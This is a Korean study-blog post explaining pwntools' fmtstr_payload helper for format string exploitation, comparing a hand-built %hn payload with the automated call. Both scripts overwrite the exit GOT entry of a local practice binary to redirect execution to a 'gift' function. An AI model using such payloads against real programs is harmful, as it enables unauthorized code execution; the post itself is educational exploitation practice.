---
title: "[PWNABLE] fmtstr_payload"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ fmtstr_payload는 fsb 취약점을 Explot하는 것을 자동화해주는 함수이다. payload = fmtstr_payload(offset, {주소 : 덮을 값})payload = fmtstr_payload(7, {addr:value})위와 "
date: "2024-06-24"
translation_key: "tistory-3ade6e6201e3"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-fmtstrpayload"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

fmtstr\_payload는 fsb 취약점을 Explot하는 것을 자동화해주는 함수이다.

```
payload = fmtstr_payload(offset, {주소 : 덮을 값})

payload = fmtstr_payload(7, {addr:value})
```

위와 같이 사용하면 된다.

64비트 환경에서 사용하고자 한다면 아래 코드를 붙여줘야 한다.

```
context.bits = 64
```

앞에서 사용한 예제의 payload를 가지고 비교를 해보겠다.

```
from pwn import*

target = b'./ex'
p = process(target)
e = ELF(target)

gift = e.sym['gift']
exit_got = e.got['exit']

payload = '%{}c'.format((gift >> 16) & 0xffff )
payload += '%9$hn'
payload += '%{}c'.format(gift & 0xffff)
payload += '%10$hn'
payload += b'\x41'*3
payload += p64(exit_got+2)
payload += p64(exit_got)

p.send(payload)

p.interactive()
```

이와 같이 직접 쪼개서 작성해주었던 것을 아래와 같이 편하게 사용할 수 있게 해준다.

```
from pwn import*

target = b'./ex'
p = process(target)
e = ELF(target)

context.bits = 64

gift = e.sym['gift']
exit_got = e.got['exit']

payload = fmtstr_payload(6,{exit_got:gift})
p.send(payload)

p.interactive()
```

![](/assets/images/tistory/tistory-3ade6e6201e3/001.png)
